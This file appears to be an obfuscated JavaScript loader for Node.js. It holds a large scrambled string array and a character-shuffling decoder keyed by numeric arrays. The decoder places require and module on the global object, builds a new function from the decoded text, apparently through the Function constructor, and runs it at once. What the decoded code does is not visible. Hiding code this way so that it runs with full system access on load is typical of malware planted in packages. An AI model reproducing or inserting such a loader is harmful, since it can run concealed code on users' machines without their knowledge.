oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
